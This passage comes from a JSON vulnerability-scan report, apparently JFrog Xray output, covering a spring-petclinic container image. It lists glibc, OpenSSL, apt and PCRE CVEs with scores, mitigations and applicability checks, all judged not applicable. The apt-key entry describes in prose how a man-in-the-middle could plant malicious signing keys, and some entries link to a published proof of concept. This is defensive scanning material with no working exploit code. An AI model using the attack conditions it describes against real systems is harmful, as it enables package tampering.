               "description": "A flaw was found in glibc. In an uncommon situation, the gaih_inet function may use memory that has been freed, resulting in an application crash. This issue is only exploitable when the getaddrinfo function is called and the hosts database in /etc/nsswitch.conf is configured with SUCCESS=continue or SUCCESS=merge.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-531741",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free vulnerability in the `getaddrinfo` function of glibc may lead to denial of service when a non-default nsswitch.conf file is used.",
            "FullDescription": "",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Deployment mitigations\n\nIn `nsswitch.conf`, remove any `success=continue` and  `success=merge` directives under the `hosts` line",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
                  "Description": "The vulnerability is only exploitable when `getaddrinfo` is called",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The vulnerability is only exploitable if a **non-default** `nsswitch.conf` file is used, where one of the following lines is present -\n* `hosts: ... success=continue...`\n* `hosts: ... success=merge ...`",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "Exploitation requires triggering a use-after-free beyond the scope of a single function. The use-after-free has not been proven to be able to cause code execution.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "CVSS does not reflect the prerequisites for applicability.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Published GitHub advisory",
                  "Url": "https://github.com/advisories/GHSA-qx6j-g797-jg9r",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Commit 1c37b80 patched this.",
                  "Url": "https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=1c37b8022e8763fedbb3f79c02e05c6acfe5a215",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2023-4813",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The hosts key configuration in nsswitch.conf is not vulnerable.",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2023-4813",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445015",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0466",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "The function X509_VERIFY_PARAM_add0_policy() is documented to implicitly enable the certificate policy check when doing certificate verification. However the implementation of the function does not enable the check which allows certificates with invalid or incorrect policies to pass the certificate verification.  As suddenly enabling the policy check could break existing deployments it was decided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy() function.  Instead the applications that require OpenSSL to perform certificate policy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly enable the policy check by calling X509_VERIFY_PARAM_set_flags() with the X509_V_FLAG_POLICY_CHECK flag argument.  Certificate policy checks are disabled by default in OpenSSL and are not commonly used by applications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0466",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0466",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445015",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "The function X509_VERIFY_PARAM_add0_policy() is documented to\nimplicitly enable the certificate policy check when doing certificate\nverification. However the implementation of the function does not\nenable the check which allows certificates with invalid or incorrect\npolicies to pass the certificate verification.\n\nAs suddenly enabling the policy check could break existing deployments it was\ndecided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy()\nfunction.\n\nInstead the applications that require OpenSSL to perform certificate\npolicy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly\nenable the policy check by calling X509_VERIFY_PARAM_set_flags() with\nthe X509_V_FLAG_POLICY_CHECK flag argument.\n\nCertificate policy checks are disabled by default in OpenSSL and are not\ncommonly used by applications.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0466",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "The function X509_VERIFY_PARAM_add0_policy() is documented to implicitly enable the certificate policy check when doing certificate verification. However the implementation of the function does not enable the check which allows certificates with invalid or incorrect policies to pass the certificate verification.  As suddenly enabling the policy check could break existing deployments it was decided to keep the existing behavior of the X509_VERIFY_PARAM_add0_policy() function.  Instead the applications that require OpenSSL to perform certificate policy check need to use X509_VERIFY_PARAM_set1_policies() or explicitly enable the policy check by calling X509_VERIFY_PARAM_set_flags() with the X509_V_FLAG_POLICY_CHECK flag argument.  Certificate policy checks are disabled by default in OpenSSL and are not commonly used by applications.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0466",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0466",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445014",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0465",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Applications that use a non-default option when verifying certificates may be vulnerable to an attack from a malicious CA to circumvent certain checks.  Invalid certificate policies in leaf certificates are silently ignored by OpenSSL and other certificate policy checks are skipped for that certificate. A malicious CA could use this to deliberately assert invalid certificate policies in order to circumvent policy checking on the certificate altogether.  Policy processing is disabled by default but can be enabled by passing the `-policy' argument to the command line utilities or by calling the `X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0465",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0465",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-445014",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Applications that use a non-default option when verifying certificates may be\nvulnerable to an attack from a malicious CA to circumvent certain checks.\n\nInvalid certificate policies in leaf certificates are silently ignored by\nOpenSSL and other certificate policy checks are skipped for that certificate.\nA malicious CA could use this to deliberately assert invalid certificate policies\nin order to circumvent policy checking on the certificate altogether.\n\nPolicy processing is disabled by default but can be enabled by passing\nthe `-policy' argument to the command line utilities or by calling the\n`X509_VERIFY_PARAM_set1_policies()' function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1n-0+deb11u5"
            ],
            "fixed_versions": [
               "1.1.1n-0+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0465",
                     "cwe": [
                        "CWE-295"
                     ],
                     "cwe_details": {
                        "CWE-295": {
                           "name": "Improper Certificate Validation",
                           "description": "The product does not validate, or incorrectly validates, a certificate."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Applications that use a non-default option when verifying certificates may be vulnerable to an attack from a malicious CA to circumvent certain checks.  Invalid certificate policies in leaf certificates are silently ignored by OpenSSL and other certificate policy checks are skipped for that certificate. A malicious CA could use this to deliberately assert invalid certificate policies in order to circumvent policy checking on the certificate altogether.  Policy processing is disabled by default but can be enabled by passing the `-policy' argument to the command line utilities or by calling the `X509_VERIFY_PARAM_set1_policies()' function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2023-0465",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2023-0465",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-34417",
         "severity": "Low",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:apt",
         "source_id": "deb://debian:bullseye:apt",
         "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
         "component_versions": {
            "id": "debian:bullseye:apt",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2011-3374",
                     "cwe": [
                        "CWE-347"
                     ],
                     "cwe_details": {
                        "CWE-347": {
                           "name": "Improper Verification of Cryptographic Signature",
                           "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
                        }
                     },
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-34417",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper signature validation in apt-key may enable Man-in-the-Middle attacks and result in code execution.",
            "FullDescription": "`apt-key` is [`apt`](https://github.com/Debian/apt)'s key management utility, and is used to manage the keys that are used by `apt` to authenticate packages.\n\nA vulnerability in `apt-key`'s `net-update` function exists, in which [`GPG`](https://www.gnupg.org/) keys, that are used for signing packages and validating their authenticity, aren't validated correctly. The `net-update` function pulls the signing keys that should be added from an insecure location (`http://...`), exposing it to a Man-in-the-Middle attack in which malicious signing keys could be added to the system's keyring. This issue happens due to a vulnerability in the `add_keys_with_veirfy_against_master_keyring()` function, which allows adding signing keys without proper signature validation. \n\nThis vulnerability then potentially allows a malicious actor to perform a Man-in-the-Middle attack on a target, by making it validate malicious packages that were signed with the `GPG` signing key used by the attacker. Effectively, this means that `apt` can be duped to install malicious services and daemons with root privileges.\n\nThe conditions for this vulnerability to be applicable:\n \n1. A valid URI should be configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`. This is the URI that an attacker would need to target in a Man In The Middle attack.\n2. The command `apt-key net-update` should be executed on the affected system, or alternatively `apt.auth.net_update()` function from [python-apt](https://pypi.org/project/python-apt/) Python module should be called. This is for the malicious keys download.\n3. After the execution of `apt-key net-update`, APT packages should be installed or updated on the machine.\n\nDo note that `apt-key` is **deprecated** and shouldn't be used, and in most Debian versions `ARCHIVE_KEYRING_URI` is not defined, making this vulnerability unexploitable in most Debian systems.",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\n* Dot not execute `apt-key` command, as it is deprecated.\n* Remove the URI configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Remote code execution is possible when the applicability conditions apply.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The conditions for this vulnerability to be applicable:\n \n1. A valid URI should be configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`. This is the URI that an attacker would need to target in a Man-in-the-Middle attack.\n2. The command `apt-key net-update` should be executed on the affected system, or alternatively `apt.auth.net_update()` function from the python-apt Python module should be called. This is for the malicious keys download.\n3. After the execution of `apt-key net-update`, APT packages should be installed or updated on the machine.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability is remotely exploitable when the applicability conditions apply.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The reporter of this issue has provided a GPG key that can be used for an actual attack, as well as a simple PoC example.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Vulnerability disclosure",
                  "Url": "https://seclists.org/fulldisclosure/2011/Sep/221",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC example",
                  "Url": "https://seclists.org/fulldisclosure/2011/Sep/222",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
            "cve_id": "CVE-2011-3374",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Vulnerable variable ARCHIVE_KEYRING_URI is not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
            "vulnerability_id": "CVE-2011-3374",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-34417",
         "severity": "Low",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libapt-pkg6.0",
         "source_id": "deb://debian:bullseye:libapt-pkg6.0",
         "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
         "component_versions": {
            "id": "debian:bullseye:apt",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2011-3374",
                     "cwe": [
                        "CWE-347"
                     ],
                     "cwe_details": {
                        "CWE-347": {
                           "name": "Improper Verification of Cryptographic Signature",
                           "description": "The product does not verify, or incorrectly verifies, the cryptographic signature for data."
                        }
                     },
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:25:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-34417",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper signature validation in apt-key may enable Man-in-the-Middle attacks and result in code execution.",
            "FullDescription": "`apt-key` is [`apt`](https://github.com/Debian/apt)'s key management utility, and is used to manage the keys that are used by `apt` to authenticate packages.\n\nA vulnerability in `apt-key`'s `net-update` function exists, in which [`GPG`](https://www.gnupg.org/) keys, that are used for signing packages and validating their authenticity, aren't validated correctly. The `net-update` function pulls the signing keys that should be added from an insecure location (`http://...`), exposing it to a Man-in-the-Middle attack in which malicious signing keys could be added to the system's keyring. This issue happens due to a vulnerability in the `add_keys_with_veirfy_against_master_keyring()` function, which allows adding signing keys without proper signature validation. \n\nThis vulnerability then potentially allows a malicious actor to perform a Man-in-the-Middle attack on a target, by making it validate malicious packages that were signed with the `GPG` signing key used by the attacker. Effectively, this means that `apt` can be duped to install malicious services and daemons with root privileges.\n\nThe conditions for this vulnerability to be applicable:\n \n1. A valid URI should be configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`. This is the URI that an attacker would need to target in a Man In The Middle attack.\n2. The command `apt-key net-update` should be executed on the affected system, or alternatively `apt.auth.net_update()` function from [python-apt](https://pypi.org/project/python-apt/) Python module should be called. This is for the malicious keys download.\n3. After the execution of `apt-key net-update`, APT packages should be installed or updated on the machine.\n\nDo note that `apt-key` is **deprecated** and shouldn't be used, and in most Debian versions `ARCHIVE_KEYRING_URI` is not defined, making this vulnerability unexploitable in most Debian systems.",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\n* Dot not execute `apt-key` command, as it is deprecated.\n* Remove the URI configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Remote code execution is possible when the applicability conditions apply.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The conditions for this vulnerability to be applicable:\n \n1. A valid URI should be configured in `ARCHIVE_KEYRING_URI` variable in the file `/usr/bin/apt-key`. This is the URI that an attacker would need to target in a Man-in-the-Middle attack.\n2. The command `apt-key net-update` should be executed on the affected system, or alternatively `apt.auth.net_update()` function from the python-apt Python module should be called. This is for the malicious keys download.\n3. After the execution of `apt-key net-update`, APT packages should be installed or updated on the machine.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "This vulnerability is remotely exploitable when the applicability conditions apply.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "The reporter of this issue has provided a GPG key that can be used for an actual attack, as well as a simple PoC example.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Vulnerability disclosure",
                  "Url": "https://seclists.org/fulldisclosure/2011/Sep/221",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC example",
                  "Url": "https://seclists.org/fulldisclosure/2011/Sep/222",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
            "cve_id": "CVE-2011-3374",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Vulnerable variable ARCHIVE_KEYRING_URI is not found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:apt:2.2.4",
            "vulnerability_id": "CVE-2011-3374",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-100751",
         "severity": "Low",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "libpcre in PCRE before 8.43 allows a subject buffer over-read in JIT when UTF is disabled, and \\X or \\R has more than one fixed quantifier, a related issue to CVE-2019-20454.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libpcre3",
         "source_id": "deb://debian:bullseye:libpcre3",
         "source_comp_id": "deb://debian:bullseye:libpcre3:2:8.39-13",
         "component_versions": {
            "id": "debian:bullseye:pcre3",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2019-20838",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "libpcre in PCRE before 8.43 allows a subject buffer over-read in JIT when UTF is disabled, and \\X or \\R has more than one fixed quantifier, a related issue to CVE-2019-20454.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:31:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-100751",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in libpcre may cause denial of service.",
            "FullDescription": "The [PCRE library](https://www.pcre.org/) is a set of functions that implement regular expression pattern matching using the same syntax and semantics as Perl 5\n\nlibpcre allows an out-of-bound read in JIT when UTF is disabled, and \\X or \\R has more than 1 fixed quantifier. \n\nApplications that use libpcre to parse untrusted input as a regular expression pattern (for example, with the `pcre_compile` function) are vulnerable to this flaw, which would allow an attacker to crash the application.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "Marked as unimportant by the Debian tracker",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Denial of service and unlikely leak of sensitive data",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "An attacker must find remote input that propagates into one of PCRE's functions that compile a regular expression, for example `pcre_compile`. In other words, the attacker must be able to compile an arbitrary regular expression remotely.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
